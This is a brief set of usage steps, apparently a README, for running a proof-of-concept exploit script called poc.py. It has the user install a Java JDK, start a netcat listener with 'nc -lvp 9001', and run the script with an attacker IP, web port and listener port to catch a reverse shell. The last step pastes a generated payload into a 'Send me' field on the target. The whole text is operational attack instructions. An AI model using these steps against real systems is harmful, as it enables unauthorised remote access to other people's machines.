For this you need poc.py python script. 

step 1: Add java jdk to system, place in /usr/bin 

step 2: go int poc.py and update the jdk location on lines  62,87, 99 

step 3: open netcat and run $ nc -lvp 9001 

step 4: in other terminal run $  python3 poc.py --userip atttackerIP --webport 8000 --lport 9001 

Step 5: copy the payload in 'Send me"
